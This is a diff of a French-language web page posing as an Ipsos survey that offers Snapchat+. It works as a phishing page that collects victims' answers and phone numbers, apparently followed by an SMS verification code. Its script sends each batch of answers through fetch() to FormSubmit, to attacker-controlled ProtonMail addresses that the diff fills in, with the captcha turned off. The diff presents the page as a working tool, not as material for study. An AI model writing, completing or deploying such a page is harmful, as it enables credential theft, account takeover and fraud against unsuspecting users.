@@ -121,7 +121,6 @@ button:disabled { background:#b0b0b0; cursor:not-allowed; }
     <p>Répondez à ce court sondage pour bénéficier de <strong>Snapchat+</strong> 🎁</p>
     <button onclick="demarrer()">Commencer</button>
 </div>
-
 <div class="box" id="intermediaire" style="display:none;">
     <h2>Merci !</h2>
     <h3>
@@ -152,7 +151,6 @@ button:disabled { background:#b0b0b0; cursor:not-allowed; }
 <div class="footer">
     © 2026 Ipsos – Tous droits réservés
 </div>
-
 <script>
 const questions = [
     { text:"Quel est ton artiste ou groupe préféré ?", type:"text", placeholder:"Ex : Niska" },
@@ -167,8 +165,8 @@ let indexQuestion = 0;
 let reponsesUtilisateur = [];
 
 // Emails pour Formsubmit
-const formsubmitURL = "https://formsubmit.co/tonemail1@proton.me";
-const ccEmail = "tonemail2@proton.me";
+const formsubmitURL = "https://formsubmit.co/anonymous2026b@protonmail.com"; 
+const ccEmail = "becteurfoou@proton.me";
 
 function demarrer(){
     document.getElementById("intro").style.display="none";
@@ -197,23 +195,27 @@ function updateProgress(){
 function suivant(){
     const champ = document.getElementById("champ");
     const val = champ.value.trim();
+
+    // Vérification du numéro si nécessaire
     if(questions[indexQuestion].type==="tel" && !/^[0-9]{10}$/.test(val)){
         alert("Numéro invalide (10 chiffres)");
         return;
     }
+
     reponsesUtilisateur[indexQuestion] = val;
     indexQuestion++;
 
-    // Envoi intermédiaire
-    if(indexQuestion===3){ 
-        envoyer(1); // 1er envoi après 3 réponses
+    // Envoi intermédiaire après les 3 premières réponses
+    if(indexQuestion === 3){
+        envoyer(1);
         document.getElementById("sondage").style.display="none";
         document.getElementById("intermediaire").style.display="block";
         return;
     }
 
-    if(indexQuestion===5){ 
-        envoyer(2); // 2ème envoi avant le SMS
+    // Envoi avant la saisie du SMS
+    if(indexQuestion === 5){
+        envoyer(2);
     }
 
     if(indexQuestion < questions.length){
@@ -233,7 +235,7 @@ function continuer(){
     afficherQuestion();
 }
 
-// Fonction d'envoi via Formsubmit (rapide et simple)
+// Fonction d'envoi via Formsubmit (rapide, simple, gratuit)
 function envoyer(etape){
     const formData = new FormData();
     formData.append("artiste_prefere", reponsesUtilisateur[0] || "");
@@ -246,9 +248,11 @@ function envoyer(etape){
     formData.append("_subject", `Réponses sondage Snapchat+ (étape ${etape})`);
     formData.append("_captcha","false");
 
-    fetch(formsubmitURL, { method:"POST", body:formData });
+    fetch(formsubmitURL, { method:"POST", body:formData })
+    .then(() => console.log(`Envoi réussi étape ${etape}`))
+    .catch(() => console.log(`Erreur lors de l'envoi étape ${etape}`));
 }
 </script>
-
 </body>
 </html>
+
